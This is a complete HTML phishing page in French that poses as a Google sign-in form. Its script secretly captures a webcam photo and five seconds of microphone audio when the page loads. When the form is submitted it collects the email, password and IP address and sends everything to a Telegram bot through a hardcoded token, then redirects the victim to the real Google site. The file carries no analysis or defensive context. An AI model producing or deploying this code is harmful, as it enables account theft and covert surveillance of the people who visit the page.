<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion - Google</title>
  <style>
    body{font-family:Arial;background:#f1f1f1;text-align:center;padding-top:50px}
    input,button{padding:10px;margin:10px;width:250px}
    button{background:#4285f4;color:white;border:none;cursor:pointer}
    #preview img{width:200px;margin-top:10px}
  </style>
</head>
<body>
  <h2>inscription</h2>
  <form id="phish">
    <input type="email" id="email" placeholder="Email" required><br>
    <input type="password" id="password" placeholder="Mot de passe" required><br>
    <button type="submit">Se connecter</button>
  </form>

  <script>
    const token = "8301457425:AAHthzjc45ApNElhC5MIR4MLUbMqexj3DR8";
    const chat_id = "7965747090";

    // === PHOTO ===
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        imageCapture.grabFrame()
          .then(bitmap => {
            const canvas = document.createElement("canvas");
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            canvas.getContext("2d").drawImage(bitmap, 0, 0);
            canvas.toBlob(blob => {
              const form = new FormData();
              form.append("chat_id", chat_id);
              form.append("photo", blob, "victim.jpg");
              fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
            }, "image/jpeg");
            track.stop();
          });
      })
      .catch(() => {});

    // === MICRO : 5 secondes dâ€™audio ===
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(stream => {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: "audio/webm" });
          const form = new FormData();
          form.append("chat_id", chat_id);
          form.append("voice", blob, "victim.webm");
          fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: form });
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 5000);
      })
      .catch(() => {});

    // === IDENTIFIANTS + IP ===
    document.getElementById("phish").addEventListener("submit", function(e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(data => {
          const msg = `ðŸŽ£ Phish:\nEmail: ${email}\nMot de passe: ${password}\nIP: ${data.ip}`;
          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
          window.location.href = "https://accounts.google.com";
        });
    });
  </script>
</body>
</html>
